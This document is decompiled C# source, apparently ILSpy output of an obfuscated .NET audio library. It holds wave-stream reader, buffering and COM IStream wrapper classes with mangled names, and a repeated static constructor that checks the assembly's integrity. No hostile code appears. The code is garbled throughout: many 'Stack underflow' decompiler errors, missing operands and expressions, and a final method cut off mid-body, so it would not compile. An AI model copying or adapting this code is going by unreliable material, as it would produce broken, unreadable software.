				global::_001A._0005 obj = ((_0005)/*Error near IL_0015: Stack underflow*/).m__0001;
				/*Error near IL_002a: Stack underflow*/(obj);
				this.m__0001 = null;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		static _0005()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0005
{
	internal sealed class _0006 : global::_0006._0006
	{
		public new struct _0001
		{
			public string _0001;

			public uint _0001;

			public uint _0002;

			public _0001(uint _0094_001E, string _0004_001F, uint _0089_0010)
			{
				_0002 = _0094_001E;
				this._0001 = _0004_001F;
				_0001 = _0089_0010 + ((_0089_0010 % 2u == 1) ? 1u : 0u);
			}
		}

		private new readonly _0005 m__0001;

		private new readonly bool m__0001;

		private new readonly long m__0001;

		private new readonly int m__0001;

		private new readonly List<_0001> m__0001 = new List<_0001>();

		private new Stream m__0001;

		private new readonly object m__0001 = new object();

		public override _0005 WaveFormat => ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;

		public override long Length => ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;

		public long SampleCount
		{
			get
			{
				//IL_0051: Incompatible stack heights: 0 vs 1
				//IL_0054: Incompatible stack heights: 0 vs 1
				//IL_0057: Incompatible stack heights: 0 vs 1
				if (((_0006)/*Error near IL_0007: Stack underflow*/).m__0001._0001 == WaveFormatEncoding.Pcm || ((_0006)/*Error near IL_0016: Stack underflow*/).m__0001._0001 == WaveFormatEncoding.Extensible || ((_0006)/*Error near IL_0029: Stack underflow*/).m__0001._0001 == WaveFormatEncoding.IeeeFloat)
				{
					return this.m__0001 / BlockAlign;
				}
				throw new FormatException(_0080._0014._0001(107386540));
			}
		}

		public override long Position
		{
			get
			{
				//IL_0015: Unknown result type (might be due to invalid IL or missing references)
				//IL_0017: Expected I8, but got Unknown
				//IL_0018: Incompatible stack heights: 0 vs 2
				//IL_001f: Incompatible stack heights: 0 vs 1
				//IL_0022: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0091_0002;
				Stream stream = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_001f: Stack underflow*/(stream);
				long num = ((_0006)/*Error near IL_0015: Stack underflow*/).m__0001;
				return /*Error near IL_0016: Stack underflow*/- num;
			}
			set
			{
				//IL_0067: Incompatible stack heights: 0 vs 1
				//IL_006d: Incompatible stack heights: 0 vs 2
				object obj = ((_0006)/*Error near IL_0007: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
				try
				{
					value = _0008_0003._0087_0006(value, global::_0012._007E_0090_0002(this));
					value -= value % this.m__0001.BlockAlign;
					_007F_0002._007E_0083_0005(this.m__0001, value + this.m__0001);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public _0006(string _000E_0090_0006)
			: this(File.OpenRead(_000E_0090_0006))
		{
			this.m__0001 = true;
		}

		public _0006(Stream _000F_0090_0006)
		{
			this.m__0001 = _000F_0090_0006;
			Stream stream = this.m__0001;
			ref readonly _0005 reference = ref this.m__0001;
			ref readonly long reference2 = ref this.m__0001;
			ref readonly int reference3 = ref this.m__0001;
			List<_0001> list = this.m__0001;
			global::_0011._0018._0001(ref reference, out reference2, stream, out reference3, list);
			Position = 0L;
		}

		protected override void _0001(bool _0002)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 1
			//IL_0041: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0006)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				if (((_0006)/*Error near IL_0014: Stack underflow*/).m__0001)
				{
					global::_0008._007E_0099(this.m__0001);
				}
				this.m__0001 = null;
			}
			global::_0005._008A(this, _0002);
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0014: Unknown result type (might be due to invalid IL or missing references)
			//IL_0197: Incompatible stack heights: 0 vs 1
			//IL_019d: Incompatible stack heights: 0 vs 1
			//IL_01a7: Incompatible stack heights: 0 vs 1
			_ = ((_0006)/*Error near IL_000f: Stack underflow*/).m__0001.BlockAlign;
			if (/*Error near IL_0015: Stack underflow*/ % /*Error near IL_0015: Stack underflow*/!= 0)
			{
				throw new ArgumentException(_009D._0093_0004(_0080._0014._0001(107386491), _0004, WaveFormat.BlockAlign));
			}
			object obj = this.m__0001;
			_0091_0002._009C_0005(obj);
			try
			{
				if (global::_0012._007E_0091_0002(this) + _0004 > this.m__0001)
				{
					_0004 = this.m__0001 - (int)global::_0012._007E_0091_0002(this);
				}
				byte[] array = new byte[_0004];
				int num = _0082._007E_0006_0004(this.m__0001, array, _0003, _0004);
				int num2 = WaveFormat._0003 / 8;
				for (int i = 0; i < num; i += num2)
				{
					if (WaveFormat._0003 == 8)
					{
						_0002[i] = array[i];
						continue;
					}
					if (WaveFormat._0003 == 16)
					{
						_0002[i] = array[i + 1];
						_0002[i + 1] = array[i];
						continue;
					}
					if (WaveFormat._0003 == 24)
					{
						_0002[i] = array[i + 2];
						_0002[i + 1] = array[i + 1];
						_0002[i + 2] = array[i];
						continue;
					}
					if (WaveFormat._0003 == 32)
					{
						_0002[i] = array[i + 3];
						_0002[i + 1] = array[i + 2];
						_0002[i + 2] = array[i + 1];
						_0002[i + 3] = array[i];
						continue;
					}
					throw new FormatException(_0080._0014._0001(107386378));
				}
				return num;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}
	}
}
namespace _0006
{
	internal abstract class _0006 : Stream, global::_001C._0004
	{
		public abstract global::_0005._0005 WaveFormat { get; }

		public override bool CanRead => true;

		public override bool CanSeek => true;

		public override bool CanWrite => false;

		public virtual int BlockAlign
		{
			get
			{
				//IL_0008: Incompatible stack heights: 0 vs 1
				//IL_000f: Incompatible stack heights: 0 vs 1
				//IL_0016: Incompatible stack heights: 0 vs 1
				_ = ((_0006)/*Error near IL_000f: Stack underflow*/).WaveFormat;
				_ = ((global::_0005._0005)/*Error near IL_0016: Stack underflow*/).BlockAlign;
				return (int)/*Error near IL_0007: Stack underflow*/;
			}
		}

		public virtual TimeSpan CurrentTime
		{
			get
			{
				//IL_001c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0022: Expected F8, but got Unknown
				//IL_0024: Incompatible stack heights: 0 vs 3
				//IL_002b: Incompatible stack heights: 0 vs 1
				//IL_002e: Incompatible stack heights: 0 vs 2
				_ = _0003_0003._007F_0006;
				_ = global::_0012._007E_0091_0002;
				/*Error near IL_002b: Stack underflow*/((object)/*Error near IL_002b: Stack underflow*/);
				_ = (double)/*Error near IL_000f: Stack underflow*/;
				int num = ((_0006)/*Error near IL_0016: Stack underflow*/).WaveFormat._0002;
				_003F val = /*Error near IL_001d: Stack underflow*// (double)num;
				return /*Error near IL_0022: Stack underflow*/((double)val);
			}
			set
			{
				//IL_0018: Unknown result type (might be due to invalid IL or missing references)
				//IL_0021: Incompatible stack heights: 0 vs 2
				//IL_0028: Incompatible stack heights: 0 vs 1
				//IL_002b: Incompatible stack heights: 0 vs 1
				_ = _007F_0002._007E_0083_0005;
				_ = value.TotalSeconds;
				int num = ((_0006)/*Error near IL_0012: Stack underflow*/).WaveFormat._0002;
				_003F val = /*Error near IL_0019: Stack underflow*/* (double)num;
				/*Error near IL_001f: Stack underflow*/((object)/*Error near IL_001f: Stack underflow*/, (long)val);
			}
		}

		public virtual TimeSpan TotalTime
		{
			get
			{
				//IL_001c: Unknown result type (might be due to invalid IL or missing references)
				//IL_0022: Expected F8, but got Unknown
				//IL_0024: Incompatible stack heights: 0 vs 3
				//IL_002b: Incompatible stack heights: 0 vs 1
				//IL_002e: Incompatible stack heights: 0 vs 2
				_ = _0003_0003._007F_0006;
				_ = global::_0012._007E_0090_0002;
				/*Error near IL_002b: Stack underflow*/((object)/*Error near IL_002b: Stack underflow*/);
				_ = (double)/*Error near IL_000f: Stack underflow*/;
				int num = ((_0006)/*Error near IL_0016: Stack underflow*/).WaveFormat._0002;
				_003F val = /*Error near IL_001d: Stack underflow*// (double)num;
				return /*Error near IL_0022: Stack underflow*/((double)val);
			}
		}

		public override void Flush()
		{
		}

		public override long Seek(long offset, SeekOrigin origin)
		{
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 2
			//IL_005d: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ == 0)
			{
				_ = _007F_0002._007E_0083_0005;
				/*Error near IL_0012: Stack underflow*/((object)/*Error near IL_0012: Stack underflow*/, (long)/*Error near IL_0012: Stack underflow*/);
			}
			else if (origin == SeekOrigin.Current)
			{
				_007F_0002._007E_0083_0005(this, global::_0012._007E_0091_0002(this) + offset);
			}
			else
			{
				_007F_0002._007E_0083_0005(this, global::_0012._007E_0090_0002(this) + offset);
			}
			return global::_0012._007E_0091_0002(this);
		}

		public override void SetLength(long length)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107385583);
			new NotSupportedException((string?)/*Error near IL_0016: Stack underflow*/);
			throw /*Error near IL_000a: Stack underflow*/;
		}

		public override void Write(byte[] buffer, int offset, int count)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107385562);
			new NotSupportedException((string?)/*Error near IL_0016: Stack underflow*/);
			throw /*Error near IL_000a: Stack underflow*/;
		}

		public virtual bool _0001(int _0002)
		{
			//IL_0015: Invalid comparison between Unknown and I8
			//IL_0019: Incompatible stack heights: 0 vs 2
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 2
			_ = global::_0012._007E_0091_0002;
			/*Error near IL_0020: Stack underflow*/((object)/*Error near IL_0020: Stack underflow*/);
			_ = global::_0012._007E_0090_0002;
			long num = /*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			return (long)/*Error near IL_0017: Stack underflow*/ < num;
		}

		static _0006()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _007F
{
	internal sealed class _0008 : global::_0006._0006, global::_0002._0007
	{
		private new string m__0001;

		internal new global::_0006._0006 _0001;

		private new readonly global::_0014._0006 m__0001;

		internal new readonly int _0001;

		internal readonly int _0002;

		private new readonly long m__0001;

		private new readonly object m__0001;

		public override global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override long Length => ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;

		public override long Position
		{
			get
			{
				//IL_0017: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 2
				//IL_0021: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0091_0002;
				global::_0006._0006 obj = ((_0008)/*Error near IL_000e: Stack underflow*/)._0001;
				/*Error near IL_0021: Stack underflow*/(obj);
				return global::_0011._0018._0001((_0008)/*Error near IL_0015: Stack underflow*/, (long)/*Error near IL_0015: Stack underflow*/);
			}
			set
			{
				//IL_003c: Incompatible stack heights: 0 vs 1
				//IL_0042: Incompatible stack heights: 0 vs 2
				object obj = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
				try
				{
					_007F_0002._007E_0083_0005(this._0001, global::_0011._0018._0001(this, value));
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		public float Volume
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001.Volume;
				return (float)/*Error near IL_000a: Stack underflow*/;
			}
			set
			{
				//IL_000d: Incompatible stack heights: 0 vs 1
				//IL_0010: Incompatible stack heights: 0 vs 2
				_ = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
				((global::_0014._0006)/*Error near IL_0017: Stack underflow*/).Volume = (float)/*Error near IL_0017: Stack underflow*/;
			}
		}

		public _0008(string _0089_0015)
		{
			this.m__0001 = new object();
			this.m__0001 = _0089_0015;
			global::_0011._0018._0001(_0089_0015, this);
			_0002 = this._0001.WaveFormat._0003 / 8 * this._0001.WaveFormat._0001;
			this.m__0001 = new global::_0014._0006(this._0001, _0096_0090_0006: false);
			this._0001 = 4 * this.m__0001.WaveFormat._0001;
			this.m__0001 = global::_0011._0018._0001(this, this._0001.Length);
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			new _0080._0004((byte[])/*Error near IL_0025: Stack underflow*/);
			_0080._0004 obj = (_0080._0004)/*Error near IL_0028: Stack underflow*/;
			int num = _0004 / 4;
			return _0001(obj.FloatBuffer, _0003 / 4, num) * 4;
		}

		public int _0001(float[] _0002, int _0003, int _0004)
		{
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_003b: Incompatible stack heights: 0 vs 2
			object obj = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				return this.m__0001._0001(_0002, _0003, _0004);
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		protected override void _0001(bool _0002)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0008)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				_ = global::_0008._007E_0004_0002;
				global::_0006._0006 obj = ((_0008)/*Error near IL_0019: Stack underflow*/)._0001;
				/*Error near IL_001e: Stack underflow*/(obj);
				this._0001 = null;
			}
			global::_0005._008A(this, _0002);
		}

		static _0008()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0012
{
	internal sealed class _0003 : global::_0006._0006
	{
		private new global::_0006._0006 m__0001;

		private new long m__0001;

		private new readonly _0019._0010 m__0001;

		private long _0002;

		internal new byte[] _0001;

		private new readonly object m__0001 = new object();

		public override int BlockAlign
		{
			get
			{
				//IL_0017: Unknown result type (might be due to invalid IL or missing references)
				//IL_0019: Expected I4, but got Unknown
				//IL_001a: Incompatible stack heights: 0 vs 1
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				_ = ((global::_0006._0006)/*Error near IL_0021: Stack underflow*/).WaveFormat;
				_ = ((global::_0005._0005)/*Error near IL_0009: Stack underflow*/)._0003 / 8;
				short num = ((global::_0006._0006)/*Error near IL_0012: Stack underflow*/).WaveFormat._0001;
				return /*Error near IL_0018: Stack underflow*/* num;
			}
		}

		public override global::_0005._0005 WaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public override long Length
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0090_0002;
				global::_0006._0006 obj = ((_0003)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0017: Stack underflow*/(obj);
				return (long)/*Error near IL_000f: Stack underflow*/;
			}
		}

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_00b4: Incompatible stack heights: 0 vs 1
				//IL_00c0: Incompatible stack heights: 0 vs 2
				object obj = ((_0003)/*Error near IL_000a: Stack underflow*/).m__0001;
				_ = _0091_0002._009C_0005;
				/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
				try
				{
					if (this.m__0001 != value)
					{
						if (this.m__0001 % BlockAlign != 0L)
						{
							throw new ArgumentException(_0080._0014._0001(107386857));
						}
						long num = value - value % this.m__0001.BlockAlign;
						if (global::_0012._007E_0091_0002(this.m__0001) != num)
						{
							_007F_0002._007E_0083_0005(this.m__0001, num);
							global::_0011._0018._0001(this.m__0001);
							_0002 = global::_0012._007E_0091_0002(this.m__0001);
						}
						this.m__0001 = value;
					}
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
			}
		}

		private long BufferEndPosition
		{
			get
			{
				//IL_0011: Unknown result type (might be due to invalid IL or missing references)
				//IL_0013: Expected I8, but got Unknown
				//IL_0014: Incompatible stack heights: 0 vs 1
				//IL_0017: Incompatible stack heights: 0 vs 2
				//IL_001e: Incompatible stack heights: 0 vs 1
				_ = ((_0003)/*Error near IL_0007: Stack underflow*/)._0002;
				_ = ((_0003)/*Error near IL_000e: Stack underflow*/).m__0001.Count;
				long num = (long)/*Error near IL_0011: Stack underflow*/;
				return /*Error near IL_0012: Stack underflow*/+ num;
			}
		}

		public _0003(global::_0006._0006 _0010_0090_0006)
		{
			this.m__0001 = _0010_0090_0006;
			this.m__0001 = new _0019._0010(_0010_0090_0006.WaveFormat._0002 * 4);
		}

		protected override void _0001(bool _0002)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0003)/*Error near IL_000b: Stack underflow*/).m__0001 != null)
			{
				_ = global::_0008._007E_0004_0002;
				global::_0006._0006 obj = ((_0003)/*Error near IL_0019: Stack underflow*/).m__0001;
				/*Error near IL_001e: Stack underflow*/(obj);
				this.m__0001 = null;
			}
			global::_0005._008A(this, _0002);
		}

		public override int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0102: Incompatible stack heights: 0 vs 1
			//IL_010e: Incompatible stack heights: 0 vs 2
			object obj = ((_0003)/*Error near IL_000a: Stack underflow*/).m__0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				while (BufferEndPosition < this.m__0001 + _0004)
				{
					int num = _0004;
					if (num % this.m__0001.BlockAlign != 0)
					{
						num = _0004 + this.m__0001.BlockAlign - _0004 % this.m__0001.BlockAlign;
					}
					int num2 = _0082._007E_0006_0004(this.m__0001, global::_0011._0018._0001(this, num), 0, num);
					global::_0011._0018._0001(this.m__0001, global::_0011._0018._0001(this, num), 0, num2);
					if (num2 == 0)
					{
						break;
					}
				}
				if (this._0002 < this.m__0001)
				{
					global::_0011._0018._0001(this.m__0001, (int)(this.m__0001 - this._0002));
					this._0002 = this.m__0001;
				}
				int num3 = global::_0011._0018._0001(this.m__0001, _0002, _0003, _0004);
				this.m__0001 += num3;
				this._0002 = this.m__0001;
				return num3;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}
	}
}
namespace _0019
{
	internal sealed class _0006 : Stream, IStream
	{
		private Stream m__0001;

		public override bool CanRead
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_001B._007E_0087_0003;
				Stream stream = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0017: Stack underflow*/(stream);
				return (byte)/*Error near IL_000f: Stack underflow*/ != 0;
			}
		}

		public override bool CanSeek
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_001B._007E_0088_0003;
				Stream stream = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0017: Stack underflow*/(stream);
				return (byte)/*Error near IL_000f: Stack underflow*/ != 0;
			}
		}

		public override bool CanWrite
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_001B._007E_0089_0003;
				Stream stream = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0017: Stack underflow*/(stream);
				return (byte)/*Error near IL_000f: Stack underflow*/ != 0;
			}
		}

		public override long Length
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0090_0002;
				Stream stream = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0017: Stack underflow*/(stream);
				return (long)/*Error near IL_000f: Stack underflow*/;
			}
		}

		public override long Position
		{
			get
			{
				//IL_0010: Incompatible stack heights: 0 vs 2
				//IL_0017: Incompatible stack heights: 0 vs 1
				_ = global::_0012._007E_0091_0002;
				Stream stream = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_0017: Stack underflow*/(stream);
				return (long)/*Error near IL_000f: Stack underflow*/;
			}
			set
			{
				//IL_0012: Incompatible stack heights: 0 vs 2
				//IL_0015: Incompatible stack heights: 0 vs 2
				_ = _007F_0002._007E_0083_0005;
				_ = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
				/*Error near IL_001c: Stack underflow*/((object)/*Error near IL_001c: Stack underflow*/, (long)/*Error near IL_001c: Stack underflow*/);
			}
		}

		public _0006(Stream _000F_008F)
			: this(_000F_008F, _0011_0090_0006: true)
		{
		}

		internal _0006(Stream _000F_008F, bool _0011_0090_0006)
		{
			if (_000F_008F == null)
			{
				throw new ArgumentNullException(global::_0080._0014._0001(107386816));
			}
			if (_0011_0090_0006)
			{
				_000F_008F = Stream.Synchronized(_000F_008F);
			}
			this.m__0001 = _000F_008F;
		}

		private unsafe void _0001(out IStream _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			*(@null*)(nint)/*Error near IL_0004: Stack underflow*/ = null;
		}

		void IStream.Clone(out IStream _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(out _0002);
		}

		private void _0001(int _0002)
		{
			//IL_0010: Incompatible stack heights: 0 vs 2
			_ = global::_0008._007E_0001_0002;
			Stream stream = ((_0006)/*Error near IL_000c: Stack underflow*/).m__0001;
			/*Error near IL_0017: Stack underflow*/(stream);
		}

		void IStream.Commit(int _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002);
		}

		private void _0001(IStream _0002, long _0003, IntPtr _0004, IntPtr _0005)
		{
		}

		void IStream.CopyTo(IStream _0002, long _0003, IntPtr _0004, IntPtr _0005)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002, _0003, _0004, _0005);
		}

		private void _0001(long _0002, long _0003, int _0004)
		{
		}

		void IStream.LockRegion(long _0002, long _0003, int _0004)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002, _0003, _0004);
		}

		private void _0001(byte[] _0002, int _0003, IntPtr _0004)
		{
			//IL_0047: Incompatible stack heights: 0 vs 2
			//IL_004e: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_ = global::_001B._007E_0087_0003;
			/*Error near IL_004e: Stack underflow*/((object)/*Error near IL_004e: Stack underflow*/);
			if ((int)/*Error near IL_000b: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107386839);
				throw new InvalidOperationException((string?)/*Error near IL_0017: Stack underflow*/);
			}
			int num = _0082._007E_0006_0004(this, _0002, 0, _0003);
			if (_0090_0002._0099_0005(_0004, IntPtr.Zero))
			{
				_0093_0002._0003_0006(_0004, num);
			}
		}

		void IStream.Read(byte[] _0002, int _0003, IntPtr _0004)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002, _0003, _0004);
		}

		private void _0001()
		{
		}

		void IStream.Revert()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		private void _0001(long _0002, int _0003, IntPtr _0004)
		{
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 2
			SeekOrigin seekOrigin = (SeekOrigin)/*Error near IL_0036: Stack underflow*/;
			_ = _000E_0003._007E_0089_0006;
			long num = /*Error near IL_0012: Stack underflow*/((object)/*Error near IL_0012: Stack underflow*/, _0002, seekOrigin);
			if (_0090_0002._0099_0005(_0004, IntPtr.Zero))
			{
				_000F_0003._008A_0006(_0004, num);
			}
		}

		void IStream.Seek(long _0002, int _0003, IntPtr _0004)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(_0002, _0003, _0004);
		}

		private void _0002(long _0002)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			//IL_0010: Incompatible stack heights: 0 vs 1
			_ = _007F_0002._007E_0084_0005;
			/*Error near IL_0017: Stack underflow*/((object)/*Error near IL_0017: Stack underflow*/, (long)/*Error near IL_0017: Stack underflow*/);
		}

		void IStream.SetSize(long _0002)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002(_0002);
		}

		private unsafe void _0001(out STATSTG _0002, int _0003)
		{
			//IL_00ab: Incompatible stack heights: 0 vs 3
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00bb: Incompatible stack heights: 0 vs 1
			STATSTG sTATSTG = default(STATSTG);
			sTATSTG.type = 2;
			_ = ref sTATSTG;
			_ = global::_0012._007E_0090_0002;
			/*Error near IL_00b5: Stack underflow*/((object)/*Error near IL_00b5: Stack underflow*/);
			((STATSTG*)(nint)/*Error near IL_0026: Stack underflow*/)->cbSize = (long)/*Error near IL_0026: Stack underflow*/;
			sTATSTG.grfMode = 0;
			STATSTG sTATSTG2 = (STATSTG)/*Error near IL_0034: Stack underflow*/;
			if (global::_001B._007E_0089_0003(this) && global::_001B._007E_0087_0003(this))
			{
				sTATSTG2.grfMode |= 2;
			}
			else if (global::_001B._007E_0087_0003(this))
			{
				sTATSTG2.grfMode |= 0;
			}
			else
			{
				if (!global::_001B._007E_0089_0003(this))
				{
					throw new ObjectDisposedException(global::_0080._0014._0001(107390815));
				}
				sTATSTG2.grfMode |= 1;
			}
			_0002 = sTATSTG2;
		}

		void IStream.Stat(out STATSTG _0002, int _0003)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001(out _0002, _0003);
		}

		private void _0002(long _0002, long _0003, int _0004)
		{
		}

		void IStream.UnlockRegion(long _0002, long _0003, int _0004)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002(_0002, _0003, _0004);
		}

		private void _0002(byte[] _0002, int _0003, IntPtr _0004)
		{
			//IL_0046: Incompatible stack heights: 0 vs 2
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			_ = global::_001B._007E_0089_0003;
			/*Error near IL_004d: Stack underflow*/((object)/*Error near IL_004d: Stack underflow*/);
			if ((int)/*Error near IL_000b: Stack underflow*/ == 0)
			{
				global::_0080._0014._0001(107386806);
				throw new InvalidOperationException((string?)/*Error near IL_0017: Stack underflow*/);
			}
			_0083._007E_0008_0004(this, _0002, 0, _0003);
			if (_0090_0002._0099_0005(_0004, IntPtr.Zero))
			{
				_0093_0002._0003_0006(_0004, _0003);
			}
		}

		void IStream.Write(byte[] _0002, int _0003, IntPtr _0004)
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0002(_0002, _0003, _0004);
		}

		public override void _0002()
		{
